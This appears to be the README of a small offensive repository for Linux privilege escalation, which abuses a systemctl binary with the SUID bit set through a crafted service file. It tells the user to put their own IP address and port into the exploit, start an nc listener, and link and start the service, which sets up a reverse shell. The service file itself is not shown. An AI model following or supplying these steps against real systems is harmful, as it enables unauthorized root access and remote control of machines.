# linux-service-privilege-escalation
Basic service used for exploitating systemctl with SUID bit set.


## To use
- Change the exploit to your IP address and port number
- optional - change the name
- start NC listener
- enable the service
  - ```systemctl link PATH/TO/name.service```
  - ``` systemctl start NAME```

### example
```
systemctl link /var/tmp/jedd.service
systemctl start jedd
```
